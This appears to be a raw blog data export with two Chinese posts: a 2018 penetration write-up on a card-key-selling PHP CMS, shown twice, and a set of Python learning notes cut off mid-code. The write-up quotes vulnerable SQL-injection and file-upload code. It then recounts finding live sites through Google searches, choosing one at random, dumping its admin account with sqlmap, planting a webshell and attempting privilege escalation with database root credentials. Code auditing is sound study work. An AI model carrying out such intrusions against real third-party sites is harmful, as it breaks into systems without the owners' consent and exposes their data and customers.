class=\"line\">\t<span class=\"meta\">&lt;?php</span> &#125;<span class=\"keyword\">elseif</span> ($_GET[<span class=\"string\">'act'</span>] == <span class=\"string\">\"query\"</span>) &#123; </span><br><span class=\"line\">\t<span class=\"comment\">/**/</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($_POST[<span class=\"string\">'tqm'</span>]))&#123;</span><br><span class=\"line\">    $tqm = $_POST[<span class=\"string\">'tqm'</span>];</span><br><span class=\"line\">    $sql = <span class=\"string\">\"select * from ayangw_km</span></span><br><span class=\"line\"><span class=\"string\">    where out_trade_no ='&#123;$tqm&#125;' or trade_no = '&#123;$tqm&#125;' or rel = '&#123;$tqm&#125;'</span></span><br><span class=\"line\"><span class=\"string\">    ORDER BY endTime desc</span></span><br><span class=\"line\"><span class=\"string\">    limit 1\"</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    $res = $DB-&gt;query($sql);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($row = $DB-&gt;fetch($res))&#123;</span><br><span class=\"line\">        $sql2 = <span class=\"string\">\"select * from ayangw_goods where id =\"</span>.$row[<span class=\"string\">'gid'</span>];</span><br><span class=\"line\">        $res2 = $DB-&gt;query($sql2);</span><br><span class=\"line\">        $row2 =$DB-&gt;fetch($res2);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(<span class=\"string\">\"&lt;script&gt;alert('无此条记录！');window.location.href='getkm.php'&lt;/script&gt;\"</span>);</span><br><span class=\"line\">        </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">\t    <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>可以看到典型的sql直接拼接造成的sql漏洞，<code>$tqm</code>参数直接传入用户输入也未做过滤。我回溯了<code>$DB</code>函数，也未发现安全过滤措施，所以sqlmap直接可以撸下来。</p>\n<p><img src=\"/2018/08/24/一次渗透纪实/sqlmap.jpg\" alt=\"noname\"></p>\n<p>其他地方的sql查询也差不多，漏洞百出，就此跳过sql注入。</p>\n<h3 id=\"后台上传漏洞\"><a href=\"#后台上传漏洞\" class=\"headerlink\" title=\"后台上传漏洞\"></a>后台上传漏洞</h3><p>来到后台在<code>set.php</code>，上传logo的代码部分如下：<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($_GET[<span class=\"string\">'mod'</span>]==<span class=\"string\">'upimg'</span>)&#123;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">'&lt;div class=\"panel panel-primary\"&gt;&lt;div class=\"panel-heading\"&gt;&lt;h3 class=\"panel-title\"&gt;更改首页LOGO&lt;/h3&gt; &lt;/div&gt;&lt;div class=\"panel-body\"&gt;'</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>($_POST[<span class=\"string\">'s'</span>]==<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">$extension=explode(<span class=\"string\">'.'</span>,$_FILES[<span class=\"string\">'file'</span>][<span class=\"string\">'name'</span>]);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (($length = count($extension)) &gt; <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">$ext = strtolower($extension[$length - <span class=\"number\">1</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>($ext==<span class=\"string\">'png'</span>||$ext==<span class=\"string\">'gif'</span>||$ext==<span class=\"string\">'jpg'</span>||$ext==<span class=\"string\">'jpeg'</span>||$ext==<span class=\"string\">'bmp'</span>)$ext=<span class=\"string\">'png'</span>;</span><br><span class=\"line\">copy($_FILES[<span class=\"string\">'file'</span>][<span class=\"string\">'tmp_name'</span>], ROOT.<span class=\"string\">'/assets/imgs/logo.'</span>.$ext);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"成功上传文件!&lt;br&gt;（可能需要清空浏览器缓存才能看到效果）\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>可以看到作者的思路就是分割开文件名跟文件后缀，然后对后缀进行小写处理，再进行对比，如果是作者白名单里的图片格式就统一改成<code>png</code>格式。</p>\n<p>但是让人哭笑不得的是作者只写了白名单的处理，<code>if</code>之后居然没写<code>else</code>。。。而且白名单的比较也是弱类型的比较，并且没有对截断符号等进行过滤。</p>\n<p>简化了一下写了一个demo示意了一下上传过程，可以看到我们的上传的文件将会直接变成<code>/assets/imgs/logo.php</code><br><img src=\"/2018/08/24/一次渗透纪实/demo.jpg\" alt=\"noname\"></p>\n<p>所以我们可以这样上传拿到webshell。</p>\n<h2 id=\"webshell\"><a href=\"#webshell\" class=\"headerlink\" title=\"webshell\"></a>webshell</h2><p>googlehack了一下，用这个卡密CMS的网站还不少。</p>\n<p><img src=\"/2018/08/24/一次渗透纪实/google.jpg\" alt=\"noname\"></p>\n<p>顺便一说，在git也发现了跟这个发卡系统非常象的一个CMS，大概上区别不大，也不知道是谁抄谁的。</p>\n<p>随便找了一个想拿个webshell试试，基本就是按照审计发现的思路，<code>sqlmap</code>爆了<code>admin</code>然后进后台传<code>webshell</code>。</p>\n<p><img src=\"/2018/08/24/一次渗透纪实/phpinfo.jpg\" alt=\"noname\"></p>\n<h2 id=\"尝试提权失败，记一下思路\"><a href=\"#尝试提权失败，记一下思路\" class=\"headerlink\" title=\"尝试提权失败，记一下思路\"></a>尝试提权失败，记一下思路</h2><p>从<strong>phpinfo</strong>中可以看到系统为windows NT CLOUD 5.2 2003，php版本为5.2,此版本暂时不知道如何绕过<strong>disablefunction</strong>。<br><img src=\"/2018/08/24/一次渗透纪实/cknife.jpg\" alt=\"noname\"><br><img src=\"/2018/08/24/一次渗透纪实/dis.png\" alt=\"noname\"><br>可以看到只有D盘的读写权限，php命令执行权限也全部禁掉了，放弃利用php提权。</p>\n<p>nmap扫一下看看<br><img src=\"/2018/08/24/一次渗透纪实/nmap.png\" alt=\"noname\"></p>\n<p> 可以看到有<strong>3306</strong>的mysql端口，尝试连接有IP限制。<strong>999</strong>端口则是<strong>phpmyadmin</strong>，之前在上文提到的<code>config.php</code>配置文件中可以get到数据库的<strong>root</strong>，于是进去<strong>phpmyadmin</strong>，尝试UDF,MOF提权，均无果。</p>\n<p><img src=\"/2018/08/24/一次渗透纪实/phpmyadmin.png\" alt=\"noname\"></p>\n<p> 有大佬提醒了一下<code>IIS</code>可以试试asp，aspx是否可以提权，测试aspx无法执行，但asp可以。上传asp测试后，组件也都不可用。。。提权无果<br><img src=\"/2018/08/24/一次渗透纪实/asp.png\" alt=\"noname\"></p>\n<p> 新手一枚请多担待！</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"记一次从代码审计到webshell到提权尝试的完整渗透过程\"><a href=\"#记一次从代码审计到webshell到提权尝试的完整渗透过程\" class=\"headerlink\" title=\"记一次从代码审计到webshell到提权尝试的完整渗透过程\"></a>记一次从代码审计到webshell到提权尝试的完整渗透过程</h1><h2 id=\"代码审计\"><a href=\"#代码审计\" class=\"headerlink\" title=\"代码审计\"></a>代码审计</h2><p><img src=\"/2018/08/24/一次渗透纪实/首页.jpg\" alt=\"noname\"><br>如图这次审计做的是某发卡cms，整体就是一个用户购买卡并提取卡密的平台。<br><img src=\"/2018/08/24/一次渗透纪实/目录.jpg\" alt=\"目录\"><br>如图，结构比较简单。</p>\n<p>其中config.php为mysql配置文件，其中会有mysql配置信息，下文会再提到。</p>\n<p><img src=\"/2018/08/24/一次渗透纪实/readme.jpg\" alt=\"readme\"><br>从readme里面可以看到，此CMS在18年4月还进行了更新。但此CMS安全水平非常差，可以说是漏洞百出。下面进行分析</p>\n<h3 id=\"sql漏洞\"><a href=\"#sql漏洞\" class=\"headerlink\" title=\"sql漏洞\"></a>sql漏洞</h3><p>进入<code>getkm.php</code>，这是一个提取卡密的页面，提供了查询卡密的接口。部分sql关键代码如下<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\t<span class=\"meta\">&lt;?php</span> &#125;<span class=\"keyword\">elseif</span> ($_GET[<span class=\"string\">'act'</span>] == <span class=\"string\">\"query\"</span>) &#123; </span><br><span class=\"line\">\t<span class=\"comment\">/**/</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($_POST[<span class=\"string\">'tqm'</span>]))&#123;</span><br><span class=\"line\">    $tqm = $_POST[<span class=\"string\">'tqm'</span>];</span><br><span class=\"line\">    $sql = <span class=\"string\">\"select * from ayangw_km</span></span><br><span class=\"line\"><span class=\"string\">    where out_trade_no ='&#123;$tqm&#125;' or trade_no = '&#123;$tqm&#125;' or rel = '&#123;$tqm&#125;'</span></span><br><span class=\"line\"><span class=\"string\">    ORDER BY endTime desc</span></span><br><span class=\"line\"><span class=\"string\">    limit 1\"</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    $res = $DB-&gt;query($sql);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($row = $DB-&gt;fetch($res))&#123;</span><br><span class=\"line\">        $sql2 = <span class=\"string\">\"select * from ayangw_goods where id =\"</span>.$row[<span class=\"string\">'gid'</span>];</span><br><span class=\"line\">        $res2 = $DB-&gt;query($sql2);</span><br><span class=\"line\">        $row2 =$DB-&gt;fetch($res2);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(<span class=\"string\">\"&lt;script&gt;alert('无此条记录！');window.location.href='getkm.php'&lt;/script&gt;\"</span>);</span><br><span class=\"line\">        </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">\t    <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>可以看到典型的sql直接拼接造成的sql漏洞，<code>$tqm</code>参数直接传入用户输入也未做过滤。我回溯了<code>$DB</code>函数，也未发现安全过滤措施，所以sqlmap直接可以撸下来。</p>\n<p><img src=\"/2018/08/24/一次渗透纪实/sqlmap.jpg\" alt=\"noname\"></p>\n<p>其他地方的sql查询也差不多，漏洞百出，就此跳过sql注入。</p>\n<h3 id=\"后台上传漏洞\"><a href=\"#后台上传漏洞\" class=\"headerlink\" title=\"后台上传漏洞\"></a>后台上传漏洞</h3><p>来到后台在<code>set.php</code>，上传logo的代码部分如下：<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($_GET[<span class=\"string\">'mod'</span>]==<span class=\"string\">'upimg'</span>)&#123;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">'&lt;div class=\"panel panel-primary\"&gt;&lt;div class=\"panel-heading\"&gt;&lt;h3 class=\"panel-title\"&gt;更改首页LOGO&lt;/h3&gt; &lt;/div&gt;&lt;div class=\"panel-body\"&gt;'</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>($_POST[<span class=\"string\">'s'</span>]==<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">$extension=explode(<span class=\"string\">'.'</span>,$_FILES[<span class=\"string\">'file'</span>][<span class=\"string\">'name'</span>]);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (($length = count($extension)) &gt; <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">$ext = strtolower($extension[$length - <span class=\"number\">1</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>($ext==<span class=\"string\">'png'</span>||$ext==<span class=\"string\">'gif'</span>||$ext==<span class=\"string\">'jpg'</span>||$ext==<span class=\"string\">'jpeg'</span>||$ext==<span class=\"string\">'bmp'</span>)$ext=<span class=\"string\">'png'</span>;</span><br><span class=\"line\">copy($_FILES[<span class=\"string\">'file'</span>][<span class=\"string\">'tmp_name'</span>], ROOT.<span class=\"string\">'/assets/imgs/logo.'</span>.$ext);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"成功上传文件!&lt;br&gt;（可能需要清空浏览器缓存才能看到效果）\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>可以看到作者的思路就是分割开文件名跟文件后缀，然后对后缀进行小写处理，再进行对比，如果是作者白名单里的图片格式就统一改成<code>png</code>格式。</p>\n<p>但是让人哭笑不得的是作者只写了白名单的处理，<code>if</code>之后居然没写<code>else</code>。。。而且白名单的比较也是弱类型的比较，并且没有对截断符号等进行过滤。</p>\n<p>简化了一下写了一个demo示意了一下上传过程，可以看到我们的上传的文件将会直接变成<code>/assets/imgs/logo.php</code><br><img src=\"/2018/08/24/一次渗透纪实/demo.jpg\" alt=\"noname\"></p>\n<p>所以我们可以这样上传拿到webshell。</p>\n<h2 id=\"webshell\"><a href=\"#webshell\" class=\"headerlink\" title=\"webshell\"></a>webshell</h2><p>googlehack了一下，用这个卡密CMS的网站还不少。</p>\n<p><img src=\"/2018/08/24/一次渗透纪实/google.jpg\" alt=\"noname\"></p>\n<p>顺便一说，在git也发现了跟这个发卡系统非常象的一个CMS，大概上区别不大，也不知道是谁抄谁的。</p>\n<p>随便找了一个想拿个webshell试试，基本就是按照审计发现的思路，<code>sqlmap</code>爆了<code>admin</code>然后进后台传<code>webshell</code>。</p>\n<p><img src=\"/2018/08/24/一次渗透纪实/phpinfo.jpg\" alt=\"noname\"></p>\n<h2 id=\"尝试提权失败，记一下思路\"><a href=\"#尝试提权失败，记一下思路\" class=\"headerlink\" title=\"尝试提权失败，记一下思路\"></a>尝试提权失败，记一下思路</h2><p>从<strong>phpinfo</strong>中可以看到系统为windows NT CLOUD 5.2 2003，php版本为5.2,此版本暂时不知道如何绕过<strong>disablefunction</strong>。<br><img src=\"/2018/08/24/一次渗透纪实/cknife.jpg\" alt=\"noname\"><br><img src=\"/2018/08/24/一次渗透纪实/dis.png\" alt=\"noname\"><br>可以看到只有D盘的读写权限，php命令执行权限也全部禁掉了，放弃利用php提权。</p>\n<p>nmap扫一下看看<br><img src=\"/2018/08/24/一次渗透纪实/nmap.png\" alt=\"noname\"></p>\n<p> 可以看到有<strong>3306</strong>的mysql端口，尝试连接有IP限制。<strong>999</strong>端口则是<strong>phpmyadmin</strong>，之前在上文提到的<code>config.php</code>配置文件中可以get到数据库的<strong>root</strong>，于是进去<strong>phpmyadmin</strong>，尝试UDF,MOF提权，均无果。</p>\n<p><img src=\"/2018/08/24/一次渗透纪实/phpmyadmin.png\" alt=\"noname\"></p>\n<p> 有大佬提醒了一下<code>IIS</code>可以试试asp，aspx是否可以提权，测试aspx无法执行，但asp可以。上传asp测试后，组件也都不可用。。。提权无果<br><img src=\"/2018/08/24/一次渗透纪实/asp.png\" alt=\"noname\"></p>\n<p> 新手一枚请多担待！</p>\n"},{"title":"Python学习","date":"2018-11-10T09:56:29.000Z","_content":"\n# 计划 #\n\n1. 固定学习管道，mooc教程，练习python100例，Python核心编程第二版，廖雪峰python教程。\n2. 熟练python特性，包括变量，条件，循环，数据类型，高阶函数（函数式编程），装饰器，函数式编程，面向对象编程。\n3. 掌握二分、快排算法以及正则表达式。\n4. 掌握python常用的标准库、第三方库及常用函数。\n```\nimport sys,os,re,random,base64,md5,urllib,requests,socket,beautifulsoup,...\n\nmap(),reduce(),filter(),lambda,pprint(),...\n```\n5. 多写爬虫，POC，sqlmaptamper，Bruteforce之类的脚本来熟练运用。\n6. 看项目写项目 `#TODO`\n\n#  学习管道 #\nhttps://www.imooc.com/learn/317 慕课python进阶，可以动手的教程\n\nhttp://www.runoob.com/python/python-100-examples.html python100例\n\nhttps://wizardforcel.gitbooks.io/core-python-2e/content/ Python 核心编程 第二版\n\nhttps://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000 廖雪峰python3教程（比较深 偏向开发）\n\nhttp://www.runoob.com/python 菜鸟教程\n\n#  查询管道 #\n\n`help()`函数 #查看帮助\n\nhttps://docs.python.org/3/ #官方文档 \n\nhttp://www.pythondoc.com/pythontutorial3/index.html #中文文档 \n\n其他的就是多google了\n\n\n# 变量特点 #\n\n大小写敏感，强类型，不需要声明即可使用（赋值时加上小数点即可变为浮点型，）\n```\n10/4 = 2\n\n10.0/4 = 2.5\n```\n#  数据类型 #\n\nlist（列表）\n\n用`[]`来声明，特点是有序、动态（同一list中可以包含str，int，float，bool多种数据形式）\n`foo = ['foo',100,Ture]`\n\ntuple（元组）\n用`()`来声明，与list的唯一区别是创建后不可修改。\n注意：由于`()`也是规定的优先运算符号，所以创建单元素tuple时需要使用`(\"foo\",)`多加一个`,`。\n```\n#列表生成式一例\nprint [a*100+b*10+a for a in range(1,10) for b in range(0,10) ]\n#生成121，222，232诸如此类3位对称数的列表\n```\n**dict**ionaries（字典）\n用`{}`来声明，如字典其名，是key与value一一映射的数据类型。\n特点是\n\n1. 按key查找查找速度快，但占用内存大，与list正好相反。\n2. 无序\n```\nd = {\n    'Adam': 95,\n    'Lisa': 85,\n    'Bart': 59\n}\nprint(d)\n#{'Lisa': 85, 'Adam': 95, 'Bart': 59}\n\n```\n\n3. key必须是不可变的数据类型，即不能是list。\n\n```\nd = {\n    ['a', 'b']: True\n}\nprint(d)\n\n#TypeError: unhashable type: 'list'\n```\n\n4. set(组、集合)\n基本就是只有key没有value的dict，判断元素是否在set中，使用in操作符。\n```\ns = set(['Adam', 'Lisa', 'Paul'])\nL = ['Adam', 'Lisa', 'Bart', 'Paul']\nfor name in L:\n    if name in s:\n        s.remove(name)\n    else:\n        s.add(name)\nprint s\n```\n\n# 条件判断和循环 #\n\n**注意！判断语句后必须要有`:`，并且需要特别注意缩进！**\n\n`if-elif-else`的多条件判断。\n\n`for-in`的迭代遍历循环,可用于多重循环。 \n```\n#记得提前声明的变量才可以+=\nL = range(1,101)\nsum = 0\nfor i in L:\n    sum += i*i\nprint sum\n```\n\n`while-continue-break`条件判断循环，利用break判断结束循环，continue判断跳过这次循环进行下一次循环。\n```\nsum = 0\nx = 0\nwhile True:\n    x = x + 1\n    if x > 100:\n        break\n    if x%2 == 0:\n        continue\n    sum += x\nprint sum\n```\n\n# 切片 #\n\n对有序的数据类型（list,tuple）可以进行切片（slipe）操作：\n```\n# 以下是pyhon2环境下的结果，因为py2中range()代表了一个List，py3中要使用list(range())才是一个List。\nL = range(1, 101)\n# 前10个数；\n# 3的倍数；\n# 不大于50的5的倍数。\n# 最后10个数；\n# 最后10个5的倍数。\nprint L[:10] #等同于L[0:10]\nprint L[2::3] \nprint L[4:50:5] \nprint L[-10:]\nprint L[-46::5]\n```\n对字符串的切片：\n```\n# 利用切片操作完成仅首字母变成大写的自定义函数\ndef firstCharUpper(s):\n    return s[:1].upper()+s[1:]\n\nprint firstCharUpper('hello')\nprint firstCharUpper('sunday')\nprint firstCharUpper('september')\n#Hello\n#Sunday\n#September\n```\n\n# 函数 #\n\n## 函数特性 ##\n\n1. python中自定义函数对全局变量的引用比较特殊。\n```\nsum = 0\ndef square_of_sum(L):\n    for i in L:\n        sum += i*i\n    return sum\nprint square_of_sum([1, 2, 3, 4, 5])\n# UnboundLocalError: local variable 'sum' referenced before assignment （报错：本地变量sum在赋值之前被引用了\n# 说明在def定义函数之前所进行赋值的sum其实没有被引用在def中\n# 不推荐使用全局变量，如若真的要使用全局变量可参考下例示范\nsum = 0\ndef square_of_sum(L):\n    for i in L:\n        global sum\n        sum += i*i\n    return sum\nprint square_of_sum([1, 2, 3, 4, 5])\n```\n\n2. 在python函数的结果中返回多个值的时候其实就是返回了一个`tuple`元组。\n3. 递归函数：在函数内部，可以调用其他函数。如果一个函数在内部调用自身本身，这个函数就是递归函数。\n```\n以经典的汉诺塔问题为例\n# move(n, a, b, c)表示的是有n个盘子在a柱子上，将要移到b柱子上面去\ndef move(n, a, b, c):\n# 如果a柱子上面只有一个盘子，则直接移到c柱子上面去并输出路径，结束递归\n    if n == 1:  \n        print a, '-->', c\n        return\n# 表示的是将n-1的盘子从a柱子上面移到b柱子上面去\n    move(n-1, a, c, b)\n# 输出最下面个盘子移从a移到c的路径\n    print a, '-->', c\n# 将b柱子上面的n-1个盘子移动到c柱子上面\n    move(n-1, b, a, c)\n\nmove(4, 'A', 'B', 'C')\n```\n4. 默认参数只能定义在必需参数的后面：\n```# OK:\ndef fn1(a, b=1, c=2):\n    pass\n# Error:\ndef fn2(a=1, b):\n    pass\n```\n\n## 常用函数 ##\n\n### map()\n高阶函数：map()将列表中的变量遍历并且一一传入第一个参数的函数中进行处理：\n```\n求每个数的平方\ndef f(x):\n    return x*x\nprint map(f, [1, 2, 3, 4, 5, 6, 7, 8, 9])\n#[1, 4, 9, 16, 25, 36, 49, 64, 81]\n#注意：map()函数不改变原有的 list，而是返回一个新的 list。\n```\n### reduce()\n高阶函数：相当于传两个参数的map()\n```\n#求乘积\ndef prod(x, y):\n    return x*y\nprint reduce(prod, [2, 4, 5, 7, 12])\n#3360\n```\n### filter()\n高阶函数：filter()，经常用于过滤作用，函数返回的bool为true则保留，为false则丢弃\n```\n#只取1到100中能二次开根结果为整数的值\nimport math\n\ndef is_sqr(x):\n    return math.sqrt(x)%1==0\n\nprint filter(is_sqr, range(1, 101))\n#[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]\n```\n### 匿名函数 lambda\n\n```\n#简化代码，可以不用专门去定义一些简单的自定义函数\ndef is_not_empty(s):\n    return s and len(s.strip()) > 0\n\nprint filter(is_not_empty, ['test', None, '', 'str', '  ', 'END'])\n#以下代码作用相同\nprint filter(lambda s:s and len(s.strip())>0, ['test', None, '', 'str', '  ', 'END'])\n```\n\n### 返回函数\n\nPython的函数不但可以返回int、str、list、dict等数据类型，还可以返回函数！\n由于可以返回函数，我们在后续代码里就可以决定到底要不要调用该函数。\n```\ndef calc_prod(lst):\n    def lazy_prod():\n        def f(x, y):\n            return x * y\n        return reduce(f, lst)\n    return lazy_prod\nf = calc_prod([1, 2, 3, 4])\nprint f() #适当的延迟调用 可以优化程序运行\n```\n###闭包\n\nhttps://www.imooc.com/code/6059 大致就是返回函数不要引用任何循环变量，或者后续会发生变化的变量。\n```\ndef count():\n    fs = []\n    for i in range(1, 4):\n        def f(j=i):\n            return j*j\n        fs.append(f)\n    return fs\n\nf1, f2, f3 = count()\nprint f1(), f2(), f3()\n```\n\n### cmp()\n\n比较函数，如果x,y是字符串则比较ASCII码的大小\ncmp(...)\n    cmp(x, y) -> integer\n    \n    Return -1 if x<y, 0 if x==y, 1 if x>y.\n\n### sorted()\n依从小到大（如果其中有字符串则比较ASCII码）来对list进行排序的函数，也可以作为高阶函数使用，如下例子\n```\n# 对字符串排序时，有时候忽略大小写排序更符合习惯。请利用sorted()高阶函数，实现忽略大小写排序的算法。\n\n# 输入：['bob', 'about', 'Zoo', 'Credit']\n# 输出：['about', 'bob', 'Credit', 'Zoo']\ndef cmp_ignore_case(s1, s2):\n    return cmp(s1.lower(), s2.lower()) #返回1则将s1往后排\n\nprint sorted(['bob', 'about', 'Zoo', 'Credit'], cmp_ignore_case)\n```\n\n### enumerate()\nenumerate() 函数可以为list建立索引：\n```\n#['Adam', 'Lisa', 'Bart', 'Paul']\n#经过enumerate()变成了类似：\n#[(0, 'Adam'), (1, 'Lisa'), (2, 'Bart'), (3, 'Paul')]\n\nL = ['Adam', 'Lisa', 'Bart', 'Paul']\nfor index, name in enumerate(L):\n     print index, '-', name\n... \n0 - Adam\n1 - Lisa\n2 - Bart\n3 - Paul\n```\n\n### values()方法\ndict 对象有一个 values() 方法，这个方法把dict转换成一个包含所有value的list，这样，我们迭代的就是 dict的每一个 value：\n```\nd = { 'Adam': 95, 'Lisa': 85, 'Bart': 59 }\nprint d.values()\n# [85, 95, 59]\nfor v in d.values():\n    print v\n# 85\n# 95\n# 59\n```\n\n\n","source":"_posts/Pythonѧϰ.md","raw":"---\ntitle: Python学习\ndate: 2018-11-10 17:56:29\ntags: python\n---\n\n# 计划 #\n\n1. 固定学习管道，mooc教程，练习python100例，Python核心编程第二版，廖雪峰python教程。\n2. 熟练python特性，包括变量，条件，循环，数据类型，高阶函数（函数式编程），装饰器，函数式编程，面向对象编程。\n3. 掌握二分、快排算法以及正则表达式。\n4. 掌握python常用的标准库、第三方库及常用函数。\n```\nimport sys,os,re,random,base64,md5,urllib,requests,socket,beautifulsoup,...\n\nmap(),reduce(),filter(),lambda,pprint(),...\n```\n5. 多写爬虫，POC，sqlmaptamper，Bruteforce之类的脚本来熟练运用。\n6. 看项目写项目 `#TODO`\n\n#  学习管道 #\nhttps://www.imooc.com/learn/317 慕课python进阶，可以动手的教程\n\nhttp://www.runoob.com/python/python-100-examples.html python100例\n\nhttps://wizardforcel.gitbooks.io/core-python-2e/content/ Python 核心编程 第二版\n\nhttps://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000 廖雪峰python3教程（比较深 偏向开发）\n\nhttp://www.runoob.com/python 菜鸟教程\n\n#  查询管道 #\n\n`help()`函数 #查看帮助\n\nhttps://docs.python.org/3/ #官方文档 \n\nhttp://www.pythondoc.com/pythontutorial3/index.html #中文文档 \n\n其他的就是多google了\n\n\n# 变量特点 #\n\n大小写敏感，强类型，不需要声明即可使用（赋值时加上小数点即可变为浮点型，）\n```\n10/4 = 2\n\n10.0/4 = 2.5\n```\n#  数据类型 #\n\nlist（列表）\n\n用`[]`来声明，特点是有序、动态（同一list中可以包含str，int，float，bool多种数据形式）\n`foo = ['foo',100,Ture]`\n\ntuple（元组）\n用`()`来声明，与list的唯一区别是创建后不可修改。\n注意：由于`()`也是规定的优先运算符号，所以创建单元素tuple时需要使用`(\"foo\",)`多加一个`,`。\n```\n#列表生成式一例\nprint [a*100+b*10+a for a in range(1,10) for b in range(0,10) ]\n#生成121，222，232诸如此类3位对称数的列表\n```\n**dict**ionaries（字典）\n用`{}`来声明，如字典其名，是key与value一一映射的数据类型。\n特点是\n\n1. 按key查找查找速度快，但占用内存大，与list正好相反。\n2. 无序\n```\nd = {\n    'Adam': 95,\n    'Lisa': 85,\n    'Bart': 59\n}\nprint(d)\n#{'Lisa': 85, 'Adam': 95, 'Bart': 59}\n\n```\n\n3. key必须是不可变的数据类型，即不能是list。\n\n```\nd = {\n    ['a', 'b']: True\n}\nprint(d)\n\n#TypeError: unhashable type: 'list'\n```\n\n4. set(组、集合)\n基本就是只有key没有value的dict，判断元素是否在set中，使用in操作符。\n```\ns = set(['Adam', 'Lisa', 'Paul'])\nL = ['Adam', 'Lisa', 'Bart', 'Paul']\nfor name in L:\n    if name in s:\n        s.remove(name)\n    else:\n        s.add(name)\nprint s\n```\n\n# 条件判断和循环 #\n\n**注意！判断语句后必须要有`:`，并且需要特别注意缩进！**\n\n`if-elif-else`的多条件判断。\n\n`for-in`的迭代遍历循环,可用于多重循环。 \n```\n#记得提前声明的变量才可以+=\nL = range(1,101)\nsum = 0\nfor i in L:\n    sum += i*i\nprint sum\n```\n\n`while-continue-break`条件判断循环，利用break判断结束循环，continue判断跳过这次循环进行下一次循环。\n```\nsum = 0\nx = 0\nwhile True:\n    x = x + 1\n    if x > 100:\n        break\n    if x%2 == 0:\n        continue\n    sum += x\nprint sum\n```\n\n# 切片 #\n\n对有序的数据类型（list,tuple）可以进行切片（slipe）操作：\n```\n# 以下是pyhon2环境下的结果，因为py2中range()代表了一个List，py3中要使用list(range())才是一个List。\nL = range(1, 101)\n# 前10个数；\n# 3的倍数；\n# 不大于50的5的倍数。\n# 最后10个数；\n# 最后10个5的倍数。\nprint L[:10] #等同于L[0:10]\nprint L[2::3] \nprint L[4:50:5] \nprint L[-10:]\nprint L[-46::5]\n```\n对字符串的切片：\n```\n# 利用切片操作完成仅首字母变成大写的自定义函数\ndef firstCharUpper(s):\n    return s[:1].upper()+s[1:]\n\nprint firstCharUpper('hello')\nprint firstCharUpper('sunday')\nprint firstCharUpper('september')\n#Hello\n#Sunday\n#September\n```\n\n# 函数 #\n\n## 函数特性 ##\n\n1. python中自定义函数对全局变量的引用比较特殊。\n```\nsum = 0\ndef square_of_sum(L):\n    for i in L:\n        sum += i*i\n    return sum\nprint square_of_sum([1, 2, 3, 4, 5])\n# UnboundLocalError: local variable 'sum' referenced before assignment （报错：本地变量sum在赋值之前被引用了\n# 说明在def定义函数之前所进行赋值的sum其实没有被引用在def中\n# 不推荐使用全局变量，如若真的要使用全局变量可参考下例示范\nsum = 0\ndef square_of_sum(L):\n    for i in L:\n        global sum\n        sum += i*i\n    return sum\nprint 